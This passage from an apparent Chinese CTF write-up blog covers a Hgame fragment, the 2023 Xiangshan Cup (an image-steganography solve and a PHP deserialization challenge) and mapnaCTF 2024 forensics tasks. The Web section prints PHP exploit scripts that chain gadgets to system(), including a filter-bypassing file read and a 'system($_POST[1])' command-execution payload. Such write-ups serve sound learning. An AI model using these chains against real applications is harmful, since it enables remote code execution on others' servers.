<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">968fJD17UBzZG6e3yjF6</span><br></pre></td></tr></table></figure>
<p>挂载即得</p>
<p><img src="https://s2.loli.net/2024/02/28/tRS2iJWhKnuBrPT.png" alt="2024Hgame_18"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Hgame</tag>
      </tags>
  </entry>
  <entry>
    <title>2023香山杯-Writeup</title>
    <url>/2023/10/16/2023%E9%A6%99%E5%B1%B1%E6%9D%AF-Writeup/</url>
    <content><![CDATA[<h1>2023香山杯-Writeup</h1>
<h2 id="Misc">Misc</h2>
<h3 id="签到">签到</h3>
<p><strong>考点：base64，凯撒密码</strong></p>
<p>aW9kant6aDFmMHAzXzJfRndpfQ==</p>
<p>base64+凯撒</p>
<img src="https://s2.loli.net/2023/10/16/lCG8IXhfZFtNxdW.png" style="zoom: 67%;" />
<h3 id="pintu">pintu</h3>
<p><strong>考点：图片高度读取，进制转换，黑白图片识别，base64换表，Piet</strong></p>
<p>这题赛中被折磨了，思路出了偏差~~~</p>
<p>赛后感谢某位师傅的讲解~</p>
<p>首先本题观察一下本题所拿到的附件</p>
<p><img src="https://s2.loli.net/2023/10/16/wPJbqKApk2oDisa.png" alt=""></p>
<img src="https://s2.loli.net/2023/10/16/euzwkJIiQN5BMjf.jpg" style="zoom:67%;" />
<p>做了一个简单统计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">图片大小 (65, 67): 802 张</span><br><span class="line">图片大小 (65, 70): 699 张</span><br><span class="line">图片大小 (65, 64): 164 张</span><br><span class="line">图片大小 (65, 40): 1567 张</span><br><span class="line">图片大小 (65, 66): 351 张</span><br><span class="line">图片大小 (65, 65): 338 张</span><br><span class="line">图片大小 (65, 71): 210 张</span><br><span class="line">图片大小 (65, 61): 139 张</span><br><span class="line">图片大小 (65, 62): 112 张</span><br><span class="line">图片大小 (65, 60): 185 张</span><br><span class="line">图片大小 (65, 63): 136 张</span><br></pre></td></tr></table></figure>
<p>我刚开始的思路其实是可不可能存在八种规格的图片，将起对应八进制进行转换，但是好像不行，emmm~~~</p>
<p>然后赛后看到了原来本题的重点是在于高度和黑白，以及还有一些以前没见过的隐写利用。</p>
<p>首先可以看到，不同的图片具有几种宽度，同时提示里给出了8-&gt;10，这是在按提示将八进制数字转换为十进制数字，图片的高度有40，60-67，70，71，对应于十进制32，48-55，56，57，对应于ASCII空格，‘0’-‘9’。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 指定图片所在文件夹的路径</span></span><br><span class="line">folder_path = <span class="string">&#x27;./pintu&#x27;</span>  <span class="comment"># 请替换为实际文件夹的路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">octal_to_decimal</span>(<span class="params">octal_number</span>):</span><br><span class="line">    decimal_number = <span class="number">0</span></span><br><span class="line">    position = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 从右到左遍历八进制数的每一位</span></span><br><span class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> <span class="built_in">reversed</span>(octal_number):</span><br><span class="line">        <span class="comment"># 将每一位的字符转换为整数</span></span><br><span class="line">        digit_value = <span class="built_in">int</span>(digit)</span><br><span class="line">        <span class="comment"># 使用位权计算十进制值并累加</span></span><br><span class="line">        decimal_number += digit_value * (<span class="number">8</span> ** position)</span><br><span class="line">        position += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> decimal_number</span><br><span class="line"><span class="comment"># 打开一个名为&quot;10进制.txt&quot;的文件，准备写入数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;010.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="comment"># 循从1到4703读取图片高度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4704</span>):</span><br><span class="line">        <span class="comment"># 构建图片文件名，假设图片文件名格式为&quot;image_1.jpg&quot;，&quot;image_2.jpg&quot;等</span></span><br><span class="line">        image_filename = <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.png&#x27;</span></span><br><span class="line">        image_path = os.path.join(folder_path, image_filename)</span><br><span class="line">        <span class="comment"># 打开图片</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">        <span class="comment"># 获取图片的高度</span></span><br><span class="line">        height = img.height</span><br><span class="line">        <span class="comment">#将高度当成八进制转换为十进制，再转换为字符串</span></span><br><span class="line">        height_decimal = <span class="built_in">chr</span>(octal_to_decimal(<span class="built_in">str</span>(height)))</span><br><span class="line">        <span class="comment"># 将数据写入文件</span></span><br><span class="line">        output_file.write(<span class="string">f&#x27;<span class="subst">&#123;height_decimal&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 打开文件以读取数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;010.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read()</span><br><span class="line"><span class="comment"># 分割字符串，将数字提取出来</span></span><br><span class="line">numbers = data.split()</span><br><span class="line"><span class="comment"># 将每个数字转换为 ASCII 字符，并构建字符串</span></span><br><span class="line">ascii_string = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(num)) <span class="keyword">for</span> num <span class="keyword">in</span> numbers])</span><br><span class="line"><span class="comment"># 将ASCII字符串编码为字节数组</span></span><br><span class="line">ascii_bytes = ascii_string.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="comment"># 使用base64.b32decode解码为字节数组</span></span><br><span class="line">decoded_bytes = base64.b32decode(ascii_bytes)</span><br><span class="line"><span class="comment"># 将解码后的字节数组转换为字符串</span></span><br><span class="line">decoded_string = decoded_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="comment"># 打印 ASCII 编码的字符串</span></span><br><span class="line"><span class="built_in">print</span>(ascii_string)</span><br><span class="line"><span class="comment"># 打印解码后的字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_string)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="comment"># 将解码后的字节数组转换为字符串</span></span><br><span class="line">    decoded_string = decoded_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    output_file.write(<span class="string">f&#x27;<span class="subst">&#123;decoded_string&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>最终是得到了一个疑似base的字符串，但明显换表了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LK1vE7eNJu8g1GRUdM5UE0QKLuKK1k5UdMKNdM5UdKKcdM7UdM5UMIPcnMXUdM5UMc5vEK15IvDqm6Dqnk7um6DlXuuqCuXUm6DqdBndm6RNMvDqdM5um6RNdMuqnk5Um6DldM5dm6RUMvRUdM5udBnUdM5NdM5Unk7UdM5QXu5UEMdqm6DldM5UXu7tE6RTdM5Udb8pjuKXK0ukLbu6KB0LEuXedB45i5nJJ/aIKvxqJBXStMXH1kRuKGTGtVRuIru6jMaXKBQpL7nkLB1uQV0mtKeGIrKMKI0VEMPqMNQFKtRPMV4HANUKMM5XnIKmd/V79V5HM/eeMKQCiu1uQEoqKK3wi5KHdy0wL5U6t702KMJZjM01ncXaMkRHjulwd09lM68xigKJ9b4vL75L37VNtgKeJ/5pJV12KuM6Qg199Va2L7at9EeciMXrMKQJ97nvQknrKw5yQI82nG7SIMPU1VPCib4K1GabiM4dIg4w3rQC3BKXnG00tM0EM05xIy1mKc0TJ7u7MVxNtG0t3baQXyowENeyEw11CB4rnVXAQbxwCrKp3GaAir7VIVnAtNaS374TJb12mGK/tcoGtEnuirKaMwVkjBVpEw4l3u8wXEn11VKPdKS69b8PnN4HJk2qEVQ0iIdwKB4aib4vJNQ4mkRS37a/tbaPQMe/J/QIXr4ztgS7IE9qM/sN1GXSi01Kjw4AIuDPnMkZLg3p1E569M2wAN5FjIXMncKVKM4FtNK7Qw1dn0o7iE5XJNQf1c4IjBoNiy07igXHKB3TjblPEkK6IbRlM5ae9MxZjIeFXV71JkP8JrnxX50yX/58Kb0Ijb1kmk9qMt85JGX03E5hKI5EnN4hEu7M3MamCIRaXk7V37083/4Bdb9lXMlp3KU4iB9NKcSpL6R6Xc16nk8b3G971VR8dM5UdM55ju1ML7Q7MI7cd6so1r5k9EaajI5/1tRZjb3Y9b5w1E9k</span><br></pre></td></tr></table></figure>
<p>然后是第二个利用，识别图片，将黑色看成0，白色看成1，作为二进制字符串输出，并转用ASCII 码转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 指定图片所在文件夹的路径</span></span><br><span class="line">folder_path = <span class="string">&#x27;./pintu&#x27;</span>  <span class="comment"># 请替换为实际文件夹的路径</span></span><br><span class="line"><span class="comment"># 创建一个空列表，用于存储结果</span></span><br><span class="line">binary_values = []</span><br><span class="line"><span class="comment"># 循环从1到4703读取图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4704</span>):</span><br><span class="line">    <span class="comment"># 构建图片文件名，假设图片文件名格式为&quot;image_1.jpg&quot;，&quot;image_2.jpg&quot;等</span></span><br><span class="line">    image_filename = <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.png&#x27;</span></span><br><span class="line">    image_path = os.path.join(folder_path, image_filename)</span><br><span class="line">    <span class="comment"># 打开图片</span></span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    <span class="comment"># 将图片转换为黑白模式</span></span><br><span class="line">    bw_image = img.convert(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取像素数据</span></span><br><span class="line">    pixels = <span class="built_in">list</span>(bw_image.getdata())</span><br><span class="line">    <span class="comment"># 检查是否存在黑色像素（0），如果存在则添加0，否则添加1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> pixels:</span><br><span class="line">        binary_values.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        binary_values.append(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 将生成的二进制值连接在一起，不使用分隔符</span></span><br><span class="line">binary_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary_values))</span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line"><span class="built_in">print</span>(binary_string)</span><br><span class="line"><span class="comment"># 在二进制字符串前面补充一个0</span></span><br><span class="line">binary_string_with_prefix = <span class="string">&#x27;0&#x27;</span> + binary_string</span><br><span class="line"><span class="comment"># 将二进制字符串转换为字节对象</span></span><br><span class="line">byte_data = <span class="built_in">bytes</span>([<span class="built_in">int</span>(binary_string_with_prefix[i:i+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string_with_prefix), <span class="number">8</span>)])</span><br><span class="line"><span class="comment"># 将字节对象解码为UTF-8文本</span></span><br><span class="line">utf8_text = byte_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(utf8_text)</span><br></pre></td></tr></table></figure>
<img src="https://s2.loli.net/2023/10/16/5R3rNuz81twsxVq.png"  />
<p>得到码表</p>
<p>进行解码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;LK1vE7eNJu8g1GRUdM5UE0QKLuKK1k5UdMKNdM5UdKKcdM7UdM5UMIPcnMXUdM5UMc5vEK15IvDqm6Dqnk7um6DlXuuqCuXUm6DqdBndm6RNMvDqdM5um6RNdMuqnk5Um6DldM5dm6RUMvRUdM5udBnUdM5NdM5Unk7UdM5QXu5UEMdqm6DldM5UXu7tE6RTdM5Udb8pjuKXK0ukLbu6KB0LEuXedB45i5nJJ/aIKvxqJBXStMXH1kRuKGTGtVRuIru6jMaXKBQpL7nkLB1uQV0mtKeGIrKMKI0VEMPqMNQFKtRPMV4HANUKMM5XnIKmd/V79V5HM/eeMKQCiu1uQEoqKK3wi5KHdy0wL5U6t702KMJZjM01ncXaMkRHjulwd09lM68xigKJ9b4vL75L37VNtgKeJ/5pJV12KuM6Qg199Va2L7at9EeciMXrMKQJ97nvQknrKw5yQI82nG7SIMPU1VPCib4K1GabiM4dIg4w3rQC3BKXnG00tM0EM05xIy1mKc0TJ7u7MVxNtG0t3baQXyowENeyEw11CB4rnVXAQbxwCrKp3GaAir7VIVnAtNaS374TJb12mGK/tcoGtEnuirKaMwVkjBVpEw4l3u8wXEn11VKPdKS69b8PnN4HJk2qEVQ0iIdwKB4aib4vJNQ4mkRS37a/tbaPQMe/J/QIXr4ztgS7IE9qM/sN1GXSi01Kjw4AIuDPnMkZLg3p1E569M2wAN5FjIXMncKVKM4FtNK7Qw1dn0o7iE5XJNQf1c4IjBoNiy07igXHKB3TjblPEkK6IbRlM5ae9MxZjIeFXV71JkP8JrnxX50yX/58Kb0Ijb1kmk9qMt85JGX03E5hKI5EnN4hEu7M3MamCIRaXk7V37083/4Bdb9lXMlp3KU4iB9NKcSpL6R6Xc16nk8b3G971VR8dM5UdM55ju1ML7Q7MI7cd6so1r5k9EaajI5/1tRZjb3Y9b5w1E9k&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到关键信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iVBORw0KGgoAAAANSUhEUgAAAEwAAAAUCAMAAAAQlCuDAAAAP1BMVEX/////wMD//8DA/8DA///AwP//wP//AAD//wAA/wAA//8AAP//AP/AAADAwAAAwAAAwMAAAMDAAMD///8AAADMRO/yAAABkklEQVQ4ja2UyZLDIAxExWL2zVT+/1tHIDngODWnvJODXa2mJQUskkWtivD6IKIRvXeTUidMLoSszU/qRHn+pUQAQueKBy5bAnRrIQSNxFD58/UW3xUnB9shPrKYhUC0mIYt4iSOnlN3BV8S+lxuLbhBkQZsY7HuI2qk2FhTE24vXbJhkZRa2CyDFQSLcWB7GFW1c5khwmHYLAfLNzhUgjfyHPXxspcNquQwieIISRQlZ6KT9y3Q5RK7KiRrjMF83OrcO6Y9xFvDJ6k38eksjJxmdZGJKzHsXy2fh/egH86I7DxeiS94my+O8xpKsE7YfEqAR2bkqwxn3J/NCeyd3UxizhB3sa/OHsZgJjq5Bg2sVDhjHr5Y6/Rp7gdHzVUo8JXO1uM0hw+e1raJ3+qzmdTt5dUHzKuu76PvX5y1Q3sOd8Vmx7z9uxtnUw9nn1OErZoxPZIaK0mbzFMY3Lm0glDYcFqmViVnft/F/Q+E3deq1bUaSwxbLMTqJK9oiGMdsYmrxWBf8EN+qPayv7T2+k/rD6rwKfsf5fOmAAAAAElFTkSuQmCC  </span><br><span class="line">data:image/png;base64</span><br></pre></td></tr></table></figure>
<p>用base转换为图片</p>
<img src="https://s2.loli.net/2023/10/16/kIpf1dmY6XhSjyQ.png" style="zoom:200%;" />
<p>最后是使用了Piet得到的flag，详情可以看这个<a href="https://blog.csdn.net/MarkRao/article/details/121796707">Piet一种奇葩编程语言——利用在CTF中Piet的套路应该很多</a></p>
<p><img src="https://s2.loli.net/2023/10/16/cpoZUDqsduIQCa9.png" alt=""></p>
<h2 id="Web">Web</h2>
<p><strong>考点：php反序列化</strong></p>
<h3 id="PHP-unserialize-pro">PHP_unserialize_pro</h3>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;welcome&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;Wh0 4m I?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;A_G00d_H4ck3r&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;arg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">G00d</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;U R A BAD GUY&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">H4ck3r</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">            <span class="variable">$function</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>研究了几位师傅的exp，姿势确实多</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;A_G00d_H4ck3r&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;welcome&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;A_G00d_H4ck3r&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">G00d</span></span>&#123;</span><br><span class="line">    <span class="comment">//本地调试打好的题</span></span><br><span class="line"><span class="comment">//    public $shell = &#x27;strtolower&#x27;;</span></span><br><span class="line"><span class="comment">//    public $cmd = &#x27;dir ../../../../../&#x27;;</span></span><br><span class="line"><span class="comment">//    public $cmd = &#x27;show_source(chr(47).chr(102).chr(49).chr(97).chr(103));&#x27;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="comment">//    public $cmd = &#x27;dir&#x27;;</span></span><br><span class="line"><span class="comment">//    public $cmd = &#x27;more /[e-h]1[0-b][e-h]&#x27;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;sort /[!q]1[!q][!q]&#x27;</span>;</span><br><span class="line"><span class="comment">//    public $cmd = &#x27;cd /;echo `more dir`&#x27;;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; <span class="comment">//__invoke会在把对象当作一个方法调用的时候自动调用</span></span><br><span class="line">        <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;U R A BAD GUY&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H4ck3r</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="keyword">new</span> <span class="title class_">G00d</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;arg = <span class="keyword">new</span> <span class="title class_">H4ck3r</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;welcome&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">G00d</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H4ck3r</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">H4ck3r</span>();</span><br><span class="line"><span class="variable">$w</span> = <span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$g</span> = <span class="keyword">new</span> <span class="title class_">G00d</span>();</span><br><span class="line"><span class="variable">$w</span>-&gt;name=<span class="string">&quot;A_G00d_H4ck3r&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;arg = <span class="variable">$h</span>;</span><br><span class="line"><span class="variable">$h</span>-&gt;func = <span class="variable">$g</span>;</span><br><span class="line"><span class="variable">$g</span>-&gt;shell=<span class="string">&quot;urldecode&quot;</span>;</span><br><span class="line"><span class="variable">$g</span>-&gt;cmd = <span class="string">&quot;system(\$_POST[1]);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>香山杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2024mapnaCTF-Writeup-Forensics</title>
    <url>/2024/02/03/2024mapnaCTF-Writeup-Forensics/</url>
    <content><![CDATA[<h1>2024mapnaCTF-Writeup-Forensics</h1>
<h2 id="前言">前言</h2>
<p>这是一个国际赛的复现，Forensics方向</p>
<p>实际比赛中该方向只完成一题，剩余为赛后复现</p>
<h2 id="Forensics">Forensics</h2>
<h3 id="PLC-I-🤖">PLC I 🤖</h3>
<p>在查看流量后，我们可以从长度为63的包内发现存在Trailer字符，按照顺序连接起来就是flag</p>
<p><img src="https://s2.loli.net/2024/02/03/x3foknX8vEcJ5rz.png" alt=""></p>
<h3 id="Tampered">Tampered</h3>
<p>这题当时做的时候一直在看相关字符，考虑是否是有相关的加密方式或者字符集问题，走入死胡同（</p>
<p>实际该题只是利用了一个换行符的问题打开文本文件，我们可以看到很多格式的字符串</p>
<p>直接使用记事本无异常，这边选择使用010打开，并且选择十六进制视图</p>
<p><img src="https://s2.loli.net/2024/02/03/EQIwu9XYdMWiRPB.png" alt=""></p>
<p>观察后可以看到0D0D0A，两个回车符和一个换行符</p>
<p>唯一一个可以发现不同就是使用了0D0A0D，这个也就是被篡改过的</p>
<p><img src="https://s2.loli.net/2024/02/03/DGZAkFtS2bzLn1u.png" alt=""></p>
<h3 id="PLC-II-🤖">PLC II 🤖</h3>
<p><strong>考点：西门子S7通信协议</strong></p>
<p><a href="https://wiki.wireshark.org/S7comm">S7comm - Wireshark Wiki</a></p>
<p>该题的流量是西门子的S7通信协议，在该流量片段中主要留存着的是连接、读取和设置 PLC 的时间的操作。同时我们观察实例可以发现s7 communication的data字段储存着时间戳信息，在挨个查看时间戳后竟然发现仅有编号40的流量内时间戳显示为2023年，其余均为2014，因此可以猜测出flag即为Data: (Timestamp: Sep 21, 2023 19:59:29.949)，修改格式即可</p>
<p><img src="https://s2.loli.net/2024/02/03/pNsUXv6qTPFdK9B.png" alt=""></p>
<h3 id="XXG">XXG</h3>
<p><strong>考点：gimp文件修复</strong></p>
<p>完全陌生的一种文件修复</p>
<p><a href="https://ctftime.org/writeup/38541">CTFtime.org / Mapna CTF 2024 / XXG / Writeup</a></p>
<p>重点还是资料的查询和检索问题</p>
<h3 id="Mitrek">Mitrek</h3>
<p><strong>考点：流量结构辨析</strong></p>
<p><a href="https://ptr-yudai.hatenablog.com/entry/2024/01/23/174849#Mitrek-2-solves">MapnaCTF 2023 Writeup - CTFするぞ (hatenablog.com)</a></p>
<p>emmmm，不是很看的懂，是怎么从16进制看出这个结构的，暂时放着吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  u8 size;</span><br><span class="line">  u32 always_one;</span><br><span class="line">  u8 size_minus_2;</span><br><span class="line">  u8 seq_number;</span><br><span class="line">  u8 type;</span><br><span class="line">  u8 contents[0]; // size-7 bytes</span><br><span class="line">&#125; packet_t;</span><br></pre></td></tr></table></figure>
<h3 id="JigBoy">JigBoy</h3>
<p><strong>考点：jb2</strong></p>
<p>一种叫做jb2的图片格式修正，但是复现没能成功？</p>
<p>已知信息如下，另外两份wp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ctftime.org/task/27538</span><br></pre></td></tr></table></figure>
<p>(<a href="https://ics.uci.edu/~dan/class/267/papers/jbig2.pdf">https://ics.uci.edu/~dan/class/267/papers/jbig2.pdf</a>)</p>
<p>还是搞不明白，看文档太吃力了</p>
<h2 id="总结">总结</h2>
<p>这算是一次比较认真的参与国际赛，感觉挺有趣，少了点套娃的感觉（</p>
<p>文件结构的修复，之前只碰见过一些常规的，关于这种本次也是经验不足</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>mapnaCT</tag>
      </tags>
  </entry>
  <entry>
    <title>2024HSCCTF-Writeup</title>
